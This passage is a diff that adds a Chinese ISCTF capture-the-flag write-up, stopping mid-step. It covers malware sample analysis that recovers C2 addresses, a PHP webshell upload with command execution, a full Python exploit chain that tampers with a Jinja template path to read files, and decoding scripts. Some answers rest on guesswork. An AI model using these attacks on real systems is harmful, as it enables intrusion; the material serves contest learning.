@@ -1276,6 +1276,633 @@ flag{5BC925649CB0188F52E617D70929191C}
       </tags>
   </entry>
   <entry>
+    <title>ISCTF wp</title>
+    <url>/posts/b3db3b40.html</url>
+    <content><![CDATA[病毒分析病毒分析-题目1根据题目描述中的关键线索，特别是“解压到 C:\Windows\System32”以及“模仿近期活跃的APT组织攻击手法”，这道 ISCTF 题目的答案是：
+ 海莲花 (或 OceanLotus &#x2F; APT32)
+ 🧐 分析与推理
+
+关键线索：解压到 System32
+
+题目要求将文件解压到 C:\Windows\System32 才能正常运行。这是典型的DLL 侧加载 (DLL Side-Loading) 或 DLL 劫持 (DLL Hijacking) 攻击手法的模拟。
+在这种攻击中，黑客会利用一个合法的、带有数字签名的系统程序（白文件），在其同级目录下放置一个恶意的 DLL 文件（黑文件）。
+当合法的系统程序运行时，它会优先加载同级目录下的恶意 DLL，从而在不被杀毒软件察觉的情况下执行恶意代码。这被称为**“白加黑”**技术。
+
+
+APT 组织特征
+
+虽然许多 APT 组织（如 Lazarus, APT41, Mustang Panda 等）都使用 DLL 侧加载技术，但在国内 CTF 竞赛和安全分析报告中，海莲花 (OceanLotus) 是最常被作为该技术典型案例的组织。
+他们经常使用这种手法来绕过安全检测，且非常活跃，符合题目中“近期活跃”和“模仿攻击手法”的描述。
+
+
+ISCTF 背景
+
+根据 ISCTF 往年题目（特别是 2023 年赛题）的 Writeup，出题人 f00001111 编写的这道病毒分析题，标准答案通常指向海莲花。
+
+
+
+病毒分析-题目2第一阶段载荷中的入口文件全名即ISCTF基础规则说明文档.pdf.lnk
+
+病毒分析-题目3
+Zoom Video Communications, Inc.
+病毒分析-题目5在zTools.dll中搜索字符串，运行命令strings zTool.dll | grep .dll，结果如下
+zTool.dllKERNEL32.dllSHELL32.dllC:\Windows\System32\dllhost.exentdll.dllzRCAppCore.dllKERNEL32.dll
+
+尝试zRCAppCore.dll提交正确
+病毒分析-题目6用010打开zTool.dll，观察内嵌的.rsrc&#x2F;2052&#x2F;SC&#x2F;103文件，其明显存在8字节循环的模式，猜测为xor
+
+病毒分析-题目7继续对zTool.dll分析，在Cyberchef中选择xor处理，循环尝试上一步载荷8字节循环的模式，逐一尝试后，发现解出MZ头，同时得到密钥tf7*TV&amp;8u
+
+病毒分析-题目8UPX
+病毒分析-题目9ida32位打开download.exe，shift加f12打开字符串，翻找可疑内容，发现get_cmd，同时注意到有base64换表，进入sub_402450函数，得到首次回连域名为colonised-my.sharepoint.com
+
+病毒分析-题目10分析函数，发现函数下载了一个托管在SharePoint上的文件，我们可以访问以下URL打开
+
+https://colonised-my.sharepoint.com/personal/f00001111_colonised_onmicrosoft_com/_layouts/52/download.aspx?share=EQsrTSD_4ehGvYTXbmU5zR0B0lk4L-x0r8yGztFlye2j9Q
+
+得到c2.dat，内容如下：
+
+oA0tG3aW2vT8mL5tvM1qV3cF2aB2xS6ztT7gX0zB1xR9zK8mjP0xP2iT3lO6fH1rpE4gP6pA2mE9dE7dntyVmZqZlZm5lZy5Fti2mZe1lD1bZ0nJ8gY7lR2qmP3vK5nY1hD3cT7guJ8tQ8rE6qJ1gF6ipZ0rF0vR5yB4xA4nyD7wM0lV5wC4rZ1c
+
+
+我们把E9dE7d和1lD1bZ0中间的部分找到，即ntyVmZqZlZm5lZy5Fti2mZe,显然是个base64，用之前在程序里找到的要换的表
+丢给AI换表加XOR 0x01解密一下
+import base64# 1. 输入数据cipher = &quot;ntyVmZqZlZm5lZy5Fti2mZe1&quot;# 自定义表 (题目给出的)custom_table = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/&quot;# 标准表std_table = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;# 2. Base64 换表处理 (Transliteration)# 制作映射表：将 custom_table 映射回 std_tabletrans = str.maketrans(custom_table, std_table)# 转换密文为标准 Base64 格式std_cipher = cipher.translate(trans)print(f&quot;转换后的标准Base64: &#123;std_cipher&#125;&quot;)# 3. Base64 解码decoded_bytes = base64.b64decode(std_cipher)print(f&quot;Base64解码结果(Bytes): &#123;decoded_bytes&#125;&quot;)# 4. XOR 0x01 解密result = &quot;&quot;for b in decoded_bytes:    # 将每个字节与 0x01 异或    result += chr(b ^ 0x01)print(&quot;-&quot; * 20)print(f&quot;最终解密结果: &#123;result&#125;&quot;)
+最后得到47.252.28.78|37204
+病毒分析-题目11显然为get_cmd
+web难过的bottlebottle
+💡 CTF 题解：Online Notice Board 文件上传漏洞
+
+漏洞点识别与确认 (Source Code Review)
+
+通过分析题目提供的源代码和题解提示，我们确认了漏洞点在于 registration.php 中的头像上传功能。
+漏洞类型： 无限制的文件上传 (Unrestricted File Upload)。
+漏洞原理： 应用程序在处理用户上传的头像文件时，没有对文件类型（MIME Type）或文件扩展名进行校验。
+存储路径： 上传的文件路径是可预测且可访问的：&#x2F;images&#x2F;{USER-EMAIL}&#x2F;{UPLOAD_FILENAME}。
+利用方式： 通过注册功能，将一个恶意的 PHP WebShell 文件上传到服务器。
+
+漏洞利用：上传 WebShell
+
+我们使用 Python requests 库来自动化注册过程，并上传一个包含简单命令执行函数的 PHP 后门。
+上传文件： basic_webshell.php
+WebShell 内容： 
+关键操作： 构造一个 multipart&#x2F;form-data POST 请求到 &#x2F;registration.php，确保 img 字段的文件名是 .php 扩展名。
+
+命令执行与信息收集 (Initial Reconnaissance)
+
+一旦 WebShell 上传成功，我们通过访问预定的 URL 来执行系统命令。
+WebShell URL 格式： http:&#x2F;&#x2F;[TARGET]:[PORT]&#x2F;images&#x2F;ctfuser@exploit.com&#x2F;basic_webshell.php?attack&#x3D;[COMMAND]
+权限确认：
+命令： whoami
+结果： www-data (确认我们以低权限用户身份运行，但具备执行命令的能力)。
+目录探索：
+命令： ls -la ..&#x2F;..&#x2F; (列出 Web 根目录文件)
+结果： 发现文件如 01 READ ME FIRST !!!!.txt、index.php 等，确认 Web 根目录为当前目录的上一级两层。
+路径确认：
+命令： pwd
+结果： &#x2F;var&#x2F;www&#x2F;html&#x2F;images&#x2F;ctfuser@exploit.com (确认 Web 根目录是 &#x2F;var&#x2F;www&#x2F;html&#x2F;)。
+
+搜索 Flag 文件 (Flag Discovery)
+
+由于在 Web 根目录下直接 cat 文件失败（可能是文件内容为空或权限问题），我们采取了最彻底的搜索方法。
+命令： find &#x2F; -name “flag*” (在整个文件系统中搜索以 “flag” 开头的文件)
+关键结果： 找到了两个高概率路径：
+&#x2F;home&#x2F;flag
+&#x2F;flag
+
+获取 Flag (Extraction)
+
+最后，通过 cat 命令读取最可疑的路径。
+命令： cat &#x2F;flag
+预期结果： 输出 Flag 字符串。
+总结
+该题目利用了 PHP 应用程序中常见的文件上传漏洞，攻击者通过控制文件名和上传路径，实现了 远程代码执行 (RCE)。解题的关键在于识别正确的漏洞，以及在发现 Flag 路径后，使用精确的 cat 命令来获取内容
+who am i1. 初始界面分析题目提供了一个登录页面，但从提供的脚本可以看出，实际解题不需要通过常规登录流程。页面包含：
+
+用户名&#x2F;密码输入框
+
+登录表单提交到 /login
+
+引用了外部JavaScript文件
+
+
+2. 关键发现点通过分析解题脚本，发现三个关键端点：
+2.1 /login 端点python
+ 可以使用任意凭据登录
+login_data &#x3D; {    “username”: “hack”,    “password”: “123456”,    “type”: “0”  # 关键参数！}
+发现: type 参数的存在表明可能有不同的认证方式或权限级别。
+2.2 /operate 端点python
+payload_params &#x3D; {    “username”: “app”,    “password”: “jinja_loader.searchpath”,  # 配置项名称    “confirm_password”: “&#x2F;“  # 新值：根目录}
+漏洞: 这是一个配置修改接口，允许修改Jinja2模板加载器的搜索路径！
+2.3 /impression 端点python
+flag_params &#x3D; {    “point”: “flag”  # 加载名为”flag”的模板}
+利用: 当模板搜索路径被设置为根目录 / 时，请求 flag 模板会尝试加载 /flag 文件。
+3. 漏洞原理3.1 Jinja2模板加载机制Jinja2模板引擎使用 searchpath 配置来指定模板文件的搜索目录。正常情况下：
+text
+searchpath &#x3D; [“&#x2F;app&#x2F;templates”]
+当应用请求模板 “flag” 时：
+text
+Jinja2会在 searchpath 中查找 “flag” 文件→ &#x2F;app&#x2F;templates&#x2F;flag
+3.2 漏洞利用通过 /operate 接口将 searchpath 修改为根目录：
+text
+searchpath &#x3D; [“&#x2F;“]
+此时请求 “flag” 模板：
+text
+Jinja2在根目录查找→ &#x2F;flag (系统根目录下的flag文件)
+4. 完整利用链步骤1：身份验证绕过text
+POST &#x2F;login参数: username&#x3D;hack&amp;password&#x3D;123456&amp;type&#x3D;0
+分析：type&#x3D;0可能表示管理员或特殊权限账户
+步骤2：配置篡改text
+GET &#x2F;operate参数:  username&#x3D;app  password&#x3D;jinja_loader.searchpath  # 要修改的配置项  confirm_password&#x3D;&#x2F;                # 新值：根目录
+功能：将Jinja2模板搜索路径设置为系统根目录
+步骤3：文件读取text
+GET &#x2F;impression参数: point&#x3D;flag
+结果：Jinja2尝试加载 &#x2F;flag 文件并作为模板渲染解题脚本：
+python
+import requestsimport timeTARGET_HOST = &quot;http://challenge.bluesharkinfo.com:27465&quot;def initialize_session():    &quot;&quot;&quot;创建并配置请求会话&quot;&quot;&quot;    http_session = requests.Session()    http_session.headers.update(&#123;        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (CTF-Solver/1.0)&#x27;    &#125;)    return http_sessiondef perform_authentication(client_session, user, passwd):    &quot;&quot;&quot;执行用户认证操作&quot;&quot;&quot;    auth_endpoint = f&quot;&#123;TARGET_HOST&#125;/login&quot;    credentials = &#123;        &quot;username&quot;: user,        &quot;password&quot;: passwd,        &quot;type&quot;: &quot;0&quot;    &#125;        response = client_session.post(auth_endpoint, data=credentials)    return response.status_code == 200def modify_template_config(client_session):    &quot;&quot;&quot;更改模板加载器配置&quot;&quot;&quot;    config_params = &#123;        &quot;username&quot;: &quot;app&quot;,        &quot;password&quot;: &quot;jinja_loader.searchpath&quot;,        &quot;confirm_password&quot;: &quot;/&quot;    &#125;        config_response = client_session.get(        f&quot;&#123;TARGET_HOST&#125;/operate&quot;,         params=config_params    )    return config_responsedef retrieve_flag_content(client_session):    &quot;&quot;&quot;获取目标flag文件内容&quot;&quot;&quot;    flag_params = &#123;&quot;point&quot;: &quot;flag&quot;&#125;        flag_response = client_session.get(        f&quot;&#123;TARGET_HOST&#125;/impression&quot;,        params=flag_params    )    return flag_responsedef execute_exploit_chain():    &quot;&quot;&quot;主执行流程&quot;&quot;&quot;    print(&quot;初始化解题环境...&quot;)        # 阶段1: 建立会话    ctf_session = initialize_session()    time.sleep(0.5)        # 阶段2: 身份验证    print(&quot;正在进行身份验证...&quot;)    if not perform_authentication(ctf_session, &quot;hack&quot;, &quot;123456&quot;):        print(&quot;认证失败，退出程序&quot;)        return        # 阶段3: 修改配置    print(&quot;调整系统配置...&quot;)    config_result = modify_template_config(ctf_session)    if config_result.status_code != 200:        print(&quot;配置修改异常&quot;)        # 阶段4: 获取flag    print(&quot;提取目标数据...&quot;)    flag_data = retrieve_flag_content(ctf_session)        # 输出结果    print(&quot;\n&quot; + &quot;=&quot;*40)    print(&quot;执行结果：&quot;)    print(&quot;-&quot;*40)    print(flag_data.text if flag_data else &quot;无响应内容&quot;)    print(&quot;=&quot;*40)if __name__ == &quot;__main__&quot;:    execute_exploit_chain()
+
+
+misc小蓝鲨的神秘文件直接记事本打开，发现大致意思是去小蓝鲨的官网找
+
+去小蓝鲨官网的新闻动态里找到了最近的一篇文章，https://www.bluesharkinfo.com/news/article/2025-11-25-news22
+flag在最底下
+请收下你的Flag：ISCTF{我要和小蓝鲨组一辈子CTF战队}
+星髓宝盒先用foremost分离第一张图片，得到你是优秀学生吗.txt，星髓宝盒.jpg，真-星髓宝盒.zip，
+
+foremost 1.png -o output    
+
+发现txt文档里有零宽字符，但是直接提取零宽字符无果，要先提取隐水印，得到
+
+你虽然能走到这一步，但还不是优秀学生哦，flag是专属于优秀学生的奖励，优秀学生自会知道他的咒语
+
+
+然后又再提取零宽字符，得到MD5字符串
+
+解密后得到压缩包密码!!!@@@###123
+
+ISCTF{1e7553787953e74113be4edfe8ca0e59}
+木林森解码PNG得到20000824，解码JPG得到….Mamba….，这时候需要一点联想，得到密钥2000Mamba0824
+txt文章结尾有
+
+MzFFRTlBQjJERjEwNEVFNjk1ODI0NTc5MTQwQURGMzk0NzJCRUIzMzE2Q0YxMTlBNjFBMkNDNDYwNTIzQjA2MThDNzk0QTkzNEFGRjNCOTBGNEUwMzY&#x3D;，
+
+很明显是base64，解码后得到
+
+31EE9AB2DF104EE695824579140ADF39472BEB3316CF119A61A2CC460523B0618C794A934AFF3B90F4E036
+
+题目里说Ron’s Code For…?，提示了用RC4解密，让AI写了个脚本
+import binasciidef rc4_decrypt(key, data):    # 1. 初始化 S 盒 (KSA)    S = list(range(256))    j = 0    for i in range(256):        j = (j + S[i] + key[i % len(key)]) % 256        S[i], S[j] = S[j], S[i]    # 2. 生成密钥流并解密 (PRGA)    i = j = 0    out = []    for char in data:        i = (i + 1) % 256        j = (j + S[i]) % 256        S[i], S[j] = S[j], S[i]        # 密文 XOR 密钥流 = 明文        out.append(char ^ S[(S[i] + S[j]) % 256])    return bytes(out)# 配置参数hex_ciphertext = &quot;3FFE9AB2DF104EE695824579140ADF39472BEB3316CF119A61A2CC460523B0618C794A934AFF3B90F4E036&quot;key_str = &quot;2000Mamba0824&quot;# 转换数据格式key_bytes = key_str.encode(&#x27;utf-8&#x27;)ciphertext_bytes = binascii.unhexlify(hex_ciphertext)# 执行解密decrypted_data = rc4_decrypt(key_bytes, ciphertext_bytes)# 输出结果try:    print(&quot;解密结果 (String):&quot;, decrypted_data.decode(&#x27;utf-8&#x27;))except UnicodeDecodeError:    print(&quot;解密结果 (Hex):&quot;, decrypted_data.hex())    print(&quot;包含非打印字符，可能需要进一步分析。&quot;)
+
+得到GCCTF{590CF439-E304-4E27-BE45-49CC7B02B3F3}，有点瑕疵，把GC改成IS得到flag
+冲刺！偷摸零！一道JAVA逆向题
+先解压，得到ctf.db，随便找一个sqlite在线打开，得到第一段flag
+
+ISCTF{Tom0r1_Dash
+
+
+用jd-gui打开这个rar包，一顿翻找后找到了GameOverView，比较可疑
+
+直接扔给AI
+请看 GameOverView 构造函数的最开始几行代码：public GameOverView(Person person) &#123;    // 1. 定义了一串加密的字节数组    byte[] encrypted = &#123;         5, 20, 7, 1, 103, 111, 10, 18, 32, 18,         32, 10, 18, 20, 18, 20, 116, 116, 40 &#125;;        // 2. 定义了一个密钥 key = 85    byte key = 85;        // 3. 进行异或（XOR）解密    byte[] decrypted = new byte[encrypted.length];    for (int i = 0; i &lt; encrypted.length; i++)      decrypted[i] = (byte)(encrypted[i] ^ key);         // 4. 生成了一个字符串 secret    String secret = new String(decrypted);        // ... 后面的代码全是创建界面 ...    // !!! 关键问题：secret 变量生成后，根本没有被添加到界面上显示！        // 5. 唯一的提示在这里：    this.hint1JLabel.setText(&quot;你死了...\n但是内存中似乎多了什么东西？&quot;);🕵️‍♂️ 解题分析这段代码在游戏结束时偷偷计算了一个 secret 字符串，但没有把它显示出来。提示说“内存中似乎多了什么东西”，意思就是让你去看代码里这个 secret 到底是什么。我们不需要运行代码，直接心算（XOR 85）就能解出来：Key: 85 (十进制) = 0x55 (十六进制) = 01010101 (二进制)逐个字节解密：5 ^ 85 = 80 -&gt; P20 ^ 85 = 65 -&gt; A7 ^ 85 = 82 -&gt; R1 ^ 85 = 84 -&gt; T103 ^ 85 = 50 -&gt; 2111 ^ 85 = 58 -&gt; :10 ^ 85 = 95 -&gt; _18 ^ 85 = 71 -&gt; G (18=0x12, 85=0x55, XOR=0x47=&#x27;G&#x27;)32 ^ 85 = 117 -&gt; u (32=0x20, 85=0x55, XOR=0x75=&#x27;u&#x27;)18 ^ 85 = 71 -&gt; G32 ^ 85 = 117 -&gt; u10 ^ 85 = 95 -&gt; _18 ^ 85 = 71 -&gt; G20 ^ 85 = 65 -&gt; A18 ^ 85 = 71 -&gt; G20 ^ 85 = 65 -&gt; A116 ^ 85 = 33 -&gt; !116 ^ 85 = 33 -&gt; !40 ^ 85 = 125 -&gt; &#125;🚩 最终 Flag将解密结果拼接： Part 2: PART2:_GuGu_GAGA!!&#125;结合你之前在数据库里找到的 Part 1 (ISCTF&#123;Tom0R1_Dash)：完整 Flag: ISCTF&#123;Tom0R1_Dash_GuGu_GAGA!!&#125;
+
+消失的flag不能nc连接，用ssh连接
+输入
+
+ssh qyy@challenge.bluesharkinfo.com -p 29452 | cat -A
+
+
+Miscrypto记事本打开c.png，在末尾找到了
+
+DABGHEFKLIJOPMNSTQRWXUVabYZefcdijghmnklqropuvstyzwx23016745+&#x2F;89
+
+这是base64换表，需要找到base64原码。先用binwalk扫了一下，发现还有一张图片。把图片拖进010，搜png的文件头89 50 4E 47 0D 0A 1A 0A，发现确实还有一张图片，base64原码另一张图片的文件末尾藏着
+
+fXGWkWSnLSQSAKbSeTXlUVQTGRi7KVS7jCOKTKHSXXSjHjmTABnXGLH6L1jnYLKQamTGSUCSDaOKiqeLHyD7IFO2IQGGSGbzKBUQMTe&#x3D;
+
+
+直接扔给AI，让他写了一个base64换表的脚本
+import base64# user-provided custom alphabet (64 chars)custom_alphabet = &quot;CDABGHEFKLIJOPMNSTQRWXUVabYZefcdijghmnklqropuvstyzwx23016745+/89&quot;# standard base64 alphabetstd_alphabet = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;# Build translation tablesto_std_trans = str.maketrans(custom_alphabet, std_alphabet)to_custom_trans = str.maketrans(std_alphabet, custom_alphabet)def decode_custom_b64(s: str) -&gt; bytes:    &quot;&quot;&quot;Decode a base64 string that uses the custom alphabet.&quot;&quot;&quot;    # Translate to standard base64 alphabet    std_like = s.translate(to_std_trans)    # Now use standard base64 decoder (handles padding &#x27;=&#x27;)    return base64.b64decode(std_like)def encode_custom_b64(data: bytes) -&gt; str:    &quot;&quot;&quot;Encode bytes to custom-base64 string using the custom alphabet.&quot;&quot;&quot;    # Standard base64    std_b64 = base64.b64encode(data).decode(&#x27;ascii&#x27;)    # Translate to custom alphabet    return std_b64.translate(to_custom_trans)# The string you provided to decodecustom_b64_string = &quot;fXGWkWSnLSQSAKbSeTXlUVQTGRi7KVS7jCOKTKHSXXSjHjmTABnXGLH6L1jnYLKQamTGSUCSDaOKiqeLHyD7IFO2IQGGSGbzKBUQMTe=&quot;# Decode and print resultsdecoded_bytes = decode_custom_b64(custom_b64_string)try:    # Try to decode bytes as UTF-8 text    decoded_text = decoded_bytes.decode(&#x27;utf-8&#x27;)except UnicodeDecodeError:    decoded_text = Noneprint(&quot;Custom alphabet:&quot;, custom_alphabet)print(&quot;Input (custom-base64):&quot;, custom_b64_string)print(&quot;\nDecoded bytes (hex):&quot;, decoded_bytes.hex())if decoded_text is not None:    print(&quot;Decoded text (utf-8):&quot;)    print(decoded_text)else:    print(&quot;Decoded bytes are not valid UTF-8 text; raw bytes shown in hex above.&quot;)# Example: re-encode to verify round-tripreencoded = encode_custom_b64(decoded_bytes)print(&quot;\nRe-encoded (custom-base64):&quot;, reencoded)print(&quot;\nRound-trip check:&quot;, &quot;OK&quot; if reencoded == custom_b64_string else &quot;MISMATCH&quot;)
+得到c为：
+
+7551149944252504900886507115675974911138392174398403084481505554211619110839551091782778656892126244444160100583088287091700792873342921044046712035923917
+
+然后把n.txt里的内容用brainfuck解一下
+
+得到n为：
+
+7644027341241571414254539033581025821232019860861753472899980529695625198016019462879314488666454640621660011189097660092595699889727595925351737140047609
+
+再把n，c，费马py一起丢给AI，让他费马分解一下
+#!/usr/bin/env python3&quot;&quot;&quot;fermat_decrypt.py使用 Fermat 方法尝试分解给定的 n（适用于 p 和 q 接近的情况），然后计算私钥并解密给定的密文 c（e=65537）。&quot;&quot;&quot;import mathimport systry:    # 好的方式：用 gmpy2 更快、更可靠的整数根/判定（若可用）    import gmpy2    from gmpy2 import is_square, isqrt    GMPY2 = Trueexcept Exception:    GMPY2 = Falsefrom Crypto.Util.number import long_to_bytes# ---------- 把下面 n 和 c 替换为你提供的值 ----------n = 7644027341241571414254539033581025821232019860861753472899980529695625198016019462879314488666454640621660011189097660092595699889727595925351737140047609c = 7551149944252504900886507115675974911138392174398403084481505554211619110839551091782778656892126244444160100583088287091700792873342921044046712035923917e = 65537# -------------------------------------------------------def is_perfect_square_py(n: int) -&gt; bool:    r = math.isqrt(n)    return r*r == ndef is_perfect_square_any(n: int) -&gt; bool:    if GMPY2:        return bool(is_square(n))    else:        return is_perfect_square_py(n)def isqrt_any(n: int) -&gt; int:    if GMPY2:        return int(isqrt(n))    else:        return math.isqrt(n)def fermat_factor(n: int, max_iter:int = 5_000_000, start_a: int = None):    &quot;&quot;&quot;    Fermat 分解：寻找 a, b 使 a^2 - n = b^2    max_iter: 最大尝试次数（迭代次数）    start_a: 若提供，从该 a 值开始（默认为 ceil(sqrt(n)))    返回 (p, q, iterations) 或 (None, None, iterations_on_exit)    &quot;&quot;&quot;    if start_a is None:        a = isqrt_any(n)        if a * a &lt; n:            a += 1    else:        a = start_a    iter_count = 0    while iter_count &lt; max_iter:        b2 = a*a - n        if b2 &gt;= 0 and is_perfect_square_any(b2):            b = isqrt_any(b2)            p = a - b            q = a + b            if p &gt; 1 and q &gt; 1 and p * q == n:                return int(p), int(q), iter_count        a += 1        iter_count += 1    return None, None, iter_countdef main():    print(&quot;GMPY2 available:&quot;, GMPY2)    # 可先尝试一个较小的 max_iter，如 5e6，然后根据需要放宽。    max_iter = 5_000_000    print(&quot;Starting Fermat factorization, max_iter =&quot;, max_iter)    p, q, iters = fermat_factor(n, max_iter=max_iter)    if p is None:        print(&quot;Fermat 分解在 &#123;&#125; 次内未找到因子。&quot;.format(iters))        print(&quot;建议：&quot;)        print(&quot;  - 增加 max_iter（例如 1e7 或更多），或使用 gmpy2（更快的 isqrt/is_square）。&quot;)        print(&quot;  - 如果 p,q 相差非常大，Fermat 方法不适用，需要其它分解方法（ECM/MPQS/数论库）。&quot;)        sys.exit(1)    print(&quot;Found factors after &#123;&#125; iterations:&quot;.format(iters))    print(&quot;p =&quot;, p)    print(&quot;q =&quot;, q)    if p &gt; q:        p, q = q, p    phi = (p-1)*(q-1)    d = pow(e, -1, phi)    m = pow(c, d, n)    try:        flag = long_to_bytes(m)    except Exception as ex:        print(&quot;long_to_bytes failed:&quot;, ex)        flag = None    print(&quot;\n--- Decryption result ---&quot;)    if flag:        print(&quot;flag (bytes):&quot;, flag)        try:            print(&quot;flag (utf-8):&quot;, flag.decode())        except Exception:            print(&quot;flag not valid UTF-8 text.&quot;)    else:        print(&quot;Recovered integer m (hex):&quot;, hex(m))if __name__ == &quot;__main__&quot;:    main()
+
+得到flag为：ISCTF{M15c_10v3_Cryp70}
+Abnormal log这是一道典型的 CTF 流量分析&#x2F;取证 (Forensics&#x2F;Misc) 题目。
+题目分析你提供的是一份服务器日志，记录了一个攻击者分段上传恶意文件的过程。我们需要从这些杂乱的日志中提取出文件内容，并还原成原始文件。
+观察日志特征：
+分段上传：日志中包含 Attacker uploading segment X…（第X段）和 File data segment: [Hex数据]。
+顺序混乱与噪声：
+时间戳是乱序的（或者被伪造了），不能直接作为排序依据。
+日志中混入了 Random data injected（随机注入数据）、Upload failure（上传失败）等干扰项。
+关键发现：虽然时间戳乱序，但在你提供的文本中，segment 1 到 segment 116 是按顺序出现的。每一块 Attacker uploading segment N 下面不远处都跟着属于它的 File data segment。
+数据特征：
+Segment 1 的数据头是 327fb9aa22190501…。
+通过对数据进行简单的频率分析（大量出现的 05），或者尝试常见文件头异或，可以推测文件被简单加密了。
+解题步骤第一步：提取并拼接 Hex 数据我们需要编写脚本，忽略噪声，只提取与 Segment 编号对应的 Hex 数据，并按顺序拼接。
+第二步：分析文件头（关键点）拼接后的 Hex 字符串开头是 327fb9aa22190501…。这并不符合常见的文件头（如 PNG 的 89504E47 或 ZIP 的 504B0304）。 观察数据中存在大量的 05，且文件末尾全是 05，推测 05 可能是异或（XOR）加密后的 00（空字节）。
+让我们尝试验证 XOR 0x05：
+原始字节：0x32 0x7f 0xb9 0xaa 0x22 0x19
+与 0x05 异或：
+0x32 ^ 0x05 &#x3D; 0x37 (‘7’)
+0x7f ^ 0x05 &#x3D; 0x7a (‘z’)
+0xb9 ^ 0x05 &#x3D; 0xbc
+0xaa ^ 0x05 &#x3D; 0xaf
+0x22 ^ 0x05 &#x3D; 0x27
+0x19 ^ 0x05 &#x3D; 0x1c
+结果头：37 7a bc af 27 1c。这是 7-Zip 压缩文件的标准文件头！
+结论： 这是一个被 0x05 异或加密的 7z 压缩包。
+完整 Python 解题脚本 (Exp)你可以直接运行以下 Python 代码来得到最终文件：
+import reimport os  # 引入 os 模块处理路径# === 自动获取脚本所在目录的绝对路径 ===# 这样无论你在哪里运行脚本，它都能找到旁边的 log.txtcurrent_dir = os.path.dirname(os.path.abspath(__file__))file_path = os.path.join(current_dir, &#x27;log.txt&#x27;)print(f&quot;正在尝试读取文件: &#123;file_path&#125;&quot;)try:    with open(file_path, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as f:        log_data = f.read()except FileNotFoundError:    print(&quot;\n[错误] 依然找不到文件！&quot;)    print(&quot;请检查以下两点：&quot;)    print(&quot;1. 你的文件名是不是变成了 &#x27;log.txt.txt&#x27;？(Windows有时候会隐藏后缀名)&quot;)    print(f&quot;2. 请确认文件确实在这个路径下: &#123;file_path&#125;&quot;)    exit()# === 下面是之前的解题逻辑 ===segments = &#123;&#125;current_seg_id = -1lines = log_data.split(&#x27;\n&#x27;)for line in lines:    seg_match = re.search(r&#x27;Attacker uploading segment (\d+)&#x27;, line)    if seg_match:        current_seg_id = int(seg_match.group(1))        continue        data_match = re.search(r&#x27;File data segment: ([0-9a-f]+)&#x27;, line)    if data_match and current_seg_id != -1:        segments[current_seg_id] = data_match.group(1)        current_seg_id = -1 print(f&quot;提取到 &#123;len(segments)&#125; 个数据段。&quot;)sorted_hex = &quot;&quot;for i in sorted(segments.keys()):    sorted_hex += segments[i]try:    raw_bytes = bytes.fromhex(sorted_hex)    decoded_bytes = bytearray()        # XOR 0x05 解密    for b in raw_bytes:        decoded_bytes.append(b ^ 0x05)            # 保存 flag.7z 到脚本同级目录    output_path = os.path.join(current_dir, &#x27;flag.7z&#x27;)    with open(output_path, &#x27;wb&#x27;) as f:        f.write(decoded_bytes)        print(f&quot;成功! 文件已保存为: &#123;output_path&#125;&quot;)    print(&quot;文件头预览(Hex):&quot;, decoded_bytes[:10].hex())    except Exception as e:    print(f&quot;发生错误: &#123;e&#125;&quot;)
+
+解出来一个flag.7z压缩包，解压得到flag.png
+
+小蓝鲨的千层FLAG先用unzip尝试解压，发现有flagggg999.zip，注释里告诉了我们密码，重复以上操作，发现一直在循环，让AI写了个脚本
+import zipfileimport reimport osimport subprocess# 起始文件current_file = &quot;flagggg999.zip&quot;while True:    if not os.path.exists(current_file):        print(f&quot;[-] 文件 &#123;current_file&#125; 消失了，停止。&quot;)        break    print(f&quot;[*] 正在处理: &#123;current_file&#125;&quot;)    try:        # 1. 用 Python 只读取注释 (Python 读注释不受加密算法影响)        try:            zf = zipfile.ZipFile(current_file)            comment = zf.comment.decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;).strip()            zf.close()        except:            print(&quot;[-] 无法读取ZIP结构，可能文件已损坏或非ZIP格式&quot;)            break        # 2. 正则提取密码        pwd_match = re.search(r&#x27;password is ([a-zA-Z0-9]+)&#x27;, comment)                if pwd_match:            pwd = pwd_match.group(1)                        # 3. 调用 7z 进行解压 (处理 Method 99 AES 加密)            # x: 解压            # -p: 密码            # -y: 自动覆盖            # -o: 输出到当前目录 (7z默认包含在内，但在脚本中显式一点比较好，这里省略-o默认当前)            cmd = [&quot;7z&quot;, &quot;x&quot;, current_file, f&quot;-p&#123;pwd&#125;&quot;, &quot;-y&quot;]                        # 只有出错时才显示输出            process = subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)                        if process.returncode != 0:                print(f&quot;[-] 7z 解压出错: &#123;process.stderr.decode()&#125;&quot;)                break                        # 4. 计算并检查下一个文件            # 提取当前数字            num_match = re.search(r&#x27;flagggg(\d+).zip&#x27;, current_file)            if num_match:                current_num = int(num_match.group(1))                next_file = f&quot;flagggg&#123;current_num - 1&#125;.zip&quot;                                # 更新循环变量                if os.path.exists(next_file):                    current_file = next_file                    # 可选：删除旧文件保持目录整洁                    # os.remove(f&quot;flagggg&#123;current_num&#125;.zip&quot;)                 else:                    print(f&quot;[-] 解压成功，但没找到下一个文件: &#123;next_file&#125;&quot;)                    break        else:            print(f&quot;\n&#123;&#x27;!&#x27;*40&#125;&quot;)            print(f&quot; 已到达无密码层！&quot;)            print(f&quot; 停止文件: &#123;current_file&#125;&quot;)            print(f&quot; 注释内容: &#123;comment if comment else &#x27;无注释&#x27;&#125;&quot;)            print(f&quot; 请在此处开始使用 bkcrack (8+4 攻击)&quot;)            print(f&quot;&#123;&#x27;!&#x27;*40&#125;\n&quot;)            break    except Exception as e:        print(f&quot;[-] 脚本发生未知错误: &#123;e&#125;&quot;)        break
+
+解压到flagggg3.zip停止了
+开始问AI，bkcrack怎么用，试了几次偏移后算出了
+执行步骤
+
+生成基于文件名的明文我们需要构造这 16 个字节：0C 00 00 00 + flagggg1.zip。 请在终端运行：
+
+PowerShell
+python -c “open(‘plain_name.bin’, ‘wb’).write(b’\x0c\x00\x00\x00’ + b’flagggg1.zip’)”(运行完可以用 xxd plain_name.bin 看一眼，开头应该是 0c 00 00 00，后面是文件名)
+
+发起攻击 (Offset 26)这次我们告诉 bkcrack，明文是从第 26 个字节开始匹配的。
+
+PowerShell
